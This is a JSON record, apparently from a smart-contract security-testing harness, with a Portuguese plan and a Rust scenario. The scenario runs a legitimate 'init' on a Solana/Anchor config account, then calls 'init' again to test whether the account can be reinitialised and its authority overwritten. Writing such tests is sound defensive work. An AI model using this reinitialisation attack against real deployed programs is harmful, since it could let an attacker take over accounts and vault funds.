{"plan": "O cenário monta uma conta `config` já inicializada (com authority, is_initialized=true e vault_balance=0) usando a própria instrução `init` como baseline, que deve ter sucesso. Em seguida, o ataque chama novamente `init` sobre a mesma conta já inicializada, tentando sobrescrever o estado. O efeito medido é que a conta foi reinicializada com sucesso e o estado foi sobrescrito (por exemplo, authority alterado para o novo signer), o que o uso legítimo não produziria.", "scenario": "let authority = Pubkey::new_unique();
let config_key = Pubkey::new_unique();

let payer = wallet(10_000_000_000);
let (system_id, system_account) = system_program_account();

let contas = vec![
    (config_key, empty_account()),
    (authority, payer.clone()),
    (system_id, system_account.clone()),
];

let metas = vec![
    AccountMeta::new(config_key, true),
    AccountMeta::new(authority, true),
    AccountMeta::new_readonly(system_id, false),
];

let ix = env.anchor_ix("init", &(), metas.clone());
let r = env.baseline("init legitimo", &ix, &contas);

let config_apos = after(&r, &config_key).clone();

let contas_ataque = vec![
    (config_key, config_apos.clone()),
    (authority, payer.clone()),
    (system_id, system_account.clone()),
];

let ix_ataque = env.anchor_ix("init", &(), metas);
let r_ataque = env.attack("reinit da conta config", &ix_ataque, &contas_ataque);

if r_ataque.program_result == ProgramResult::Success {
    let dados = after(&r_ataque, &config_key).data();
    let authority_lida = read_pubkey(dados, 8);
    let is_init = dados[40] != 0;
    env.effect("conta config foi reinicializada e authority sobrescrito", authority_lida == authority && is_init);
}"}

